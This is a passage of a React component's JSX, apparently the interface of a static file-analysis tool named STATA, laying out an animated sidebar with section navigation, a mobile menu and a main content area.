                    {selectedFile.analysisResult.strings_analysis.total_strings}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )

      default:
        return null
    }
  }

  return (
    <div className="min-h-screen bg-dark-950">
      {/* Floating Sidebar */}
      <motion.div
        initial={{ x: -100, opacity: 0 }}
        animate={{ x: 0, opacity: 1 }}
        transition={{ duration: 0.5 }}
        className={cn(
          "fixed left-6 top-6 bottom-6 w-72 bg-dark-800/95 backdrop-blur-sm rounded-2xl border border-primary-200/10 z-50 transition-all duration-300",
          sidebarOpen ? "translate-x-0" : "-translate-x-full lg:translate-x-0"
        )}
      >
        <div className="p-6 border-b border-primary-200/10">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <Shield className="w-8 h-8 text-primary-400" />
              <div>
                <h2 className="font-bold text-primary-200 font-tactical">STATA</h2>
                <p className="text-xs text-dark-400">Static Analysis</p>
              </div>
            </div>
            <button
              onClick={() => setSidebarOpen(false)}
              className="lg:hidden text-dark-400 hover:text-primary-400 transition-colors"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>

        <div className="flex-1 p-6">
          <button
            onClick={() => navigate('/stata-files')}
            className="w-full mb-6 flex items-center space-x-2 text-primary-400 hover:text-primary-300 transition-colors group"
          >
            <ArrowLeft className="w-4 h-4 group-hover:-translate-x-1 transition-transform" />
            <span>Back to File Selection</span>
          </button>

          <nav className="space-y-2">
            {sections.map((section) => {
              const Icon = section.icon
              return (
                <button
                  key={section.id}
                  onClick={() => setActiveSection(section.id)}
                  className={cn(
                    "w-full flex items-center space-x-3 px-4 py-3 rounded-xl text-left transition-all duration-200",
                    activeSection === section.id
                      ? "bg-primary-600/20 text-primary-200 border border-primary-400/20"
                      : "text-dark-300 hover:text-primary-200 hover:bg-dark-700/50"
                  )}
                >
                  <Icon className="w-5 h-5" />
                  <span className="font-medium">{section.name}</span>
                </button>
              )
            })}
          </nav>
        </div>
      </motion.div>

      {/* Mobile Menu Button */}
      <button
        onClick={() => setSidebarOpen(true)}
        className="lg:hidden fixed top-6 left-6 z-40 bg-dark-800/95 backdrop-blur-sm p-3 rounded-xl border border-primary-200/10 text-primary-400"
      >
        <Menu className="w-5 h-5" />
      </button>

      {/* Main Content */}
      <div className="lg:ml-80 p-6">
        <motion.div
          key={activeSection}
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.4 }}
          className="max-w-7xl mx-auto"
        >
          {renderContent()}
        </motion.div>
      </div>

      {/* Mobile Overlay */}
      {sidebarOpen && (
        <div
          className="lg:hidden fixed inset-0 bg-black/50 z-40"
          onClick={() => setSidebarOpen(false)}
        />
      )}
    </div>
  )
}